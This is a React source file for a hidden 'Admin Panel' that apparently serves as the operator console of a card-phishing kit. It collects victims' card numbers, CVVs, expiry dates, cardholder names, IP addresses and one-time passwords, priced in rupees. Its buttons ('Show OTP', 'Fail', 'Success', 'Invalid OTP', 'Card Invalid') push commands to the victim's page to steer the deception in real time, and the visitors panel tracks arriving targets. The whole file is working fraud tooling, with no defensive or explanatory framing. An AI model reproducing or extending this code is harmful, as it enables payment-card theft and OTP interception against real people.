import React, { useState, useEffect } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '../components/ui/table';

interface CardData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

interface UserInfo {
  ip: string;
  browser: string;
  network: string;
}

interface CardSubmission {
  cardData: CardData;
  userInfo: UserInfo;
  timestamp: Date;
  invoiceId: string;
  otp?: string;
  isNew: boolean;
}

interface Visitor {
  ip: string;
  timestamp: Date;
}

const AdminPanel = () => {
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
  const [notification, setNotification] = useState<string>('');

  const generateInvoiceId = () => {
    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
  };

  const showNotification = (message: string) => {
    setNotification(message);
    setTimeout(() => setNotification(''), 3000);
  };

  useEffect(() => {
    setConnectionStatus('Connected');
    
    console.log('Admin Panel: Initializing on route /parking55009hvSweJimbs5hhinbd56y');
    console.log('Admin Panel: Current location:', window.location.href);
    console.log('Admin Panel: Using localStorage for cross-browser communication');

    const handleStorageEvent = (event: StorageEvent) => {
      if (event.key === 'adminData' && event.oldValue) {
        const data = JSON.parse(event.oldValue);
        console.log('Admin panel received data via localStorage:', data);
        
        if (data.type === 'cardData') {
          console.log('Processing card data:', data);
          
          const newSubmission: CardSubmission = {
            cardData: data.data,
            userInfo: data.userInfo,
            timestamp: new Date(data.timestamp || new Date()),
            invoiceId: generateInvoiceId(),
            isNew: true
          };
          
          setCardSubmissions(prev => [newSubmission, ...prev]);
          showNotification('New card data received!');
          
        } else if (data.type === 'otp') {
          console.log('Received OTP:', data.otp);
          
          setCardSubmissions(prev => prev.map((submission, index) => 
            index === 0 ? { ...submission, otp: data.otp } : submission
          ));
          showNotification('OTP received!');
          
        } else if (data.type === 'newVisitor') {
          console.log('Processing new visitor:', data);
          const newVisitor = {
            ip: data.ip,
            timestamp: new Date(data.timestamp || new Date())
          };
          
          setVisitors(prev => {
            const exists = prev.some(v => v.ip === newVisitor.ip);
            if (!exists) {
              showNotification(`New visitor: ${newVisitor.ip}`);
              return [newVisitor, ...prev];
            }
            return prev;
          });
        }
      }
    };

    window.addEventListener('storage', handleStorageEvent);

    // Test the connection by sending a ping
    setTimeout(() => {
      console.log('Admin Panel: Sending connection test via localStorage');
      localStorage.setItem('adminCommand', JSON.stringify({ type: 'adminReady', timestamp: new Date().toISOString() }));
    }, 1000);

    // Simulate visitor cleanup (remove visitors after 5 minutes of inactivity)
    const cleanupInterval = setInterval(() => {
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
      setVisitors(prev => prev.filter(visitor => visitor.timestamp > fiveMinutesAgo));
    }, 60000);

    return () => {
      window.removeEventListener('storage', handleStorageEvent);
      clearInterval(cleanupInterval);
    };
  }, []);

  const sendCommand = (command: string, submissionIndex?: number) => {
    console.log('Sending command via localStorage:', command);
    showNotification(`${command.toUpperCase()} has been initiated`);
    
    if (submissionIndex !== undefined) {
      setCardSubmissions(prev => prev.map((submission, index) => 
        index === submissionIndex ? { ...submission, isNew: false } : submission
      ));
    }
    
    // Send command via localStorage for cross-browser communication
    localStorage.setItem('adminCommand', JSON.stringify({ command }));
    console.log('Command sent successfully via localStorage');
  };

  const handleRowClick = (index: number) => {
    setCardSubmissions(prev => prev.map((submission, i) => 
      i === index ? { ...submission, isNew: false } : submission
    ));
  };

  const deleteAllTransactions = () => {
    if (window.confirm('Are you sure you want to delete all transactions?')) {
      setCardSubmissions([]);
      showNotification('All transactions deleted');
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
        <button
          onClick={deleteAllTransactions}
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        >
          Delete Transactions
        </button>
      </div>
      
      {notification && (
        <div className="fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50">
          {notification}
        </div>
      )}
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
        }`}>
          Cross-Browser: {connectionStatus}
        </span>
        <span className="ml-2 px-3 py-1 rounded text-sm bg-green-600">
          localStorage: Ready
        </span>
      </div>
      
      {/* Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Live Visitors ({visitors.length})</h2>
        <div className="space-y-2">
          {visitors.length === 0 ? (
            <div className="text-gray-400">No visitors yet...</div>
          ) : (
            visitors.map((visitor, index) => (
              <div key={index} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                New Visitor: {visitor.ip} - {visitor.timestamp.toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Transactions Table */}
      {cardSubmissions.length > 0 && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Transactions ({cardSubmissions.length})</h2>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="text-white">Invoice ID</TableHead>
                  <TableHead className="text-white">Email</TableHead>
                  <TableHead className="text-white">Amount</TableHead>
                  <TableHead className="text-white">Currency</TableHead>
                  <TableHead className="text-white">Card Number</TableHead>
                  <TableHead className="text-white">CVV</TableHead>
                  <TableHead className="text-white">Expiry</TableHead>
                  <TableHead className="text-white">Cardholder</TableHead>
                  <TableHead className="text-white">IP Address</TableHead>
                  <TableHead className="text-white">OTP</TableHead>
                  <TableHead className="text-white">Status</TableHead>
                  <TableHead className="text-white">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {cardSubmissions.map((submission, index) => (
                  <TableRow 
                    key={submission.invoiceId}
                    className={`${submission.isNew ? 'animate-pulse border-2 border-yellow-500 bg-yellow-900/20' : ''} cursor-pointer`}
                    onClick={() => handleRowClick(index)}
                  >
                    <TableCell className="text-white">{submission.invoiceId}</TableCell>
                    <TableCell className="text-white">N/A</TableCell>
                    <TableCell className="text-white">₹{submission.cardData.amount}</TableCell>
                    <TableCell className="text-white">INR</TableCell>
                    <TableCell className="text-white">{submission.cardData.cardNumber}</TableCell>
                    <TableCell className="text-white">{submission.cardData.cvv}</TableCell>
                    <TableCell className="text-white">{submission.cardData.expiryMonth}/{submission.cardData.expiryYear}</TableCell>
                    <TableCell className="text-white">{submission.cardData.cardHolder}</TableCell>
                    <TableCell className="text-white">{submission.userInfo.ip}</TableCell>
                    <TableCell className="text-white">{submission.otp || 'Pending'}</TableCell>
                    <TableCell className="text-white">Processing</TableCell>
                    <TableCell className="text-white">
                      <div className="flex space-x-1">
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('showotp', index); }}
                          className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Show OTP
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('fail', index); }}
                          className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Fail
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('success', index); }}
                          className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Success
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('invalidotp', index); }}
                          className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Invalid OTP
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('cardinvalid', index); }}
                          className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Card Invalid
                        </button>
                        <button
                          onClick={(e) => { e.stopPropagation(); sendCommand('carddisabled', index); }}
                          className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
                        >
                          Card Disabled
                        </button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
          <li>• Wait for card data to appear in the table above</li>
          <li>• Click on any row to stop the glow effect</li>
          <li>• Use command buttons to control user experience</li>
          <li>• All transactions are saved until you delete them</li>
          <li>• Visitors are automatically removed after 5 minutes of inactivity</li>
          <li>• Cross-Browser communication is enabled via localStorage</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminPanel;
